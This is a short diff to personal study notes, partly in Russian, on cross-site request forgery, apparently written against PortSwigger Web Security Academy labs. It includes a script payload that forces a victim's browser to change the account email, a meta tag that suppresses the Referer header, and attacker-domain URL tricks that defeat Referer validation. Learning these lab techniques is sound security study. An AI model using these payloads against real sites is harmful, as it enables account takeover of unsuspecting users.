@@ -31,3 +31,14 @@ GET /my-account/change-email?email=sssss%40m.ru&_method=POST
 <script>
     document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
 </script>
+---------------------------------------------------------------------------
+БАЙПАСС Referrer header
+<meta name="referrer" content="never">
+вставить в html форму
+
+Если есть валидация на referrer, то можно:
+http://vulnerable-website.com.attacker-website.com/csrf-attack (добавить ориг домен, как субдомен)
+http://attacker-website.com/csrf-attack?vulnerable-website.com (добавить ориг домен как параметр)
+
+
+
